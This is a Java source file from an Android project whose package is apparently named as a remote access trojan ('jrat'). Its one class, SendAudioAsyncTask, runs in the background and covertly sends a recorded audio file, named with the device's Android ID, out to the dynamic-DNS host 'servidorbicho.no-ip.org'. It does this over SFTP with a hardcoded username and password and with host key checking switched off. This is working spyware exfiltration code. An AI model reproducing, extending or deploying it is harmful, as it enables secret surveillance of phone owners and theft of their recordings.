package com.julioxus.jrat;

import android.content.Context;
import android.os.AsyncTask;

import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;

import java.util.Properties;

/**
 * Created by julioxus on 13/03/16.
 */
public class SendAudioAsyncTask extends AsyncTask<Context, Void, String> {

    private Context context;
    private String fileName;
    private String android_id;

    public SendAudioAsyncTask(Context context, String android_id, String fileName) {
        this.context = context;
        this.fileName = fileName;
        this.android_id = android_id;

    }

    @Override
    protected String doInBackground(Context...params) {

        // Connection variables
        JSch jsch;
        Channel channel;
        Session session = null;
        ChannelSftp c = null;

        String username = "jrat";
        String host = "servidorbicho.no-ip.org";
        String pass = "master2015";

        // Establish connection with the server
        try {
            jsch = new JSch();
            session = jsch.getSession(username, host, 22);
            session.setPassword(pass);

            // Avoid asking for key confirmation
            Properties prop = new Properties();
            prop.put("StrictHostKeyChecking", "no");
            session.setConfig(prop);

            session.connect();

            channel = session.openChannel("sftp");
            channel.connect();
            c = (ChannelSftp) channel;

        } catch (Exception e) {
            e.printStackTrace();
        }

        // Send the pictures to send to the remote server

        // Send pictures to server
        try {
            String fsrc = fileName;
            String fdest = android_id+"audio.3gp";
            c.put(fsrc, fdest);
        } catch (Exception e) {
            e.printStackTrace();
        }

        // Close connection
        c.disconnect();
        session.disconnect();

        return null;
    }
}
